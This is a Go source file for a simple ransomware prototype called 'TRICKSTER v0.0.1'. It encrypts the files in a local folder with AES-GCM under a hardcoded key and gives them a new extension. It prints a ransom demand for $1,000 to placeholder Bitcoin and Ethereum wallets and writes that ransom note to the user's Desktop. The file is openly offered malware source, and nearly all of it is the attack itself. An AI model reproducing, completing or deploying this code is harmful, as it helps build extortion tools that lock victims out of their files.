package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strconv"
)

func AESEncrypt(text []byte) []byte {
	key := []byte("jdksieu38eueirktldoeiru38fjdlek3")

	// generate a new aes cipher using our 32 byte long key
	c, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(c)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return gcm.Seal(nonce, nonce, []byte(text), nil)
}

func AESDecrypt(ciphertext []byte) []byte {
	key := []byte("jdksieu38eueirktldoeiru38fjdlek3")

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}

	return []byte(plaintext)
}

func TestEncryptDecrypt() {
	plaintext := "Hello world."

	fmt.Println("[Plaintext]", plaintext)

	cipher := AESEncrypt([]byte(plaintext))

	fmt.Println("[Encrypted]", string(cipher))

	decrypted := AESDecrypt(cipher)

	fmt.Println("[Decrypted]", string(decrypted))
}

func main() {
	TestEncryptDecrypt()

	test := `YOUR FILES HAVE BEEN ENCRYPTED!!
=========================================

The files in your computer has been infected with the TRICKSTER v0.0.1 ransomware!
To retrieve your files back, please pay with the amount of $1.000 to this crypto wallet:

BTC: IUR90EKJEKL2R90329993939420399324JRHHKSAF934
ETH: OOEPWR=2389FJIEWIOOOEO3920ROIE2PRE2==ER2IKF989

And then we will send the procedures to retrieve your files back.`

	fmt.Println(test)

	fmt.Println()

	fmt.Println("[FILES TO ENCRYPT]")

	files, err := ioutil.ReadDir("./toencrypt")

	if err != nil {
		log.Fatal(err)
	}

	for i, file := range files {
		fmt.Println("[" + strconv.Itoa(i+1) + "]")
		fmt.Println(file.Name())

		// Read file bytes
		fBytes, err := ioutil.ReadFile("./toencrypt/" + file.Name())

		if err != nil {
			fmt.Println("Error reading" + file.Name())
		}

		encryptedFileName := "./encrypted/" + file.Name() + ".tricksterv001"

		fmt.Println("Encrypted: " + encryptedFileName)

		ioutil.WriteFile(encryptedFileName, AESEncrypt(fBytes), 0644)

		fmt.Println()
	}

	homeDir, _ := os.UserHomeDir()

	fmt.Println("[homedir]", homeDir)
	fmt.Println("[Desktop]", homeDir+"/Desktop")

	ioutil.WriteFile(homeDir+"/Desktop/ENCRYPTED!!! READ THIS!!", []byte(test), 0644)
}
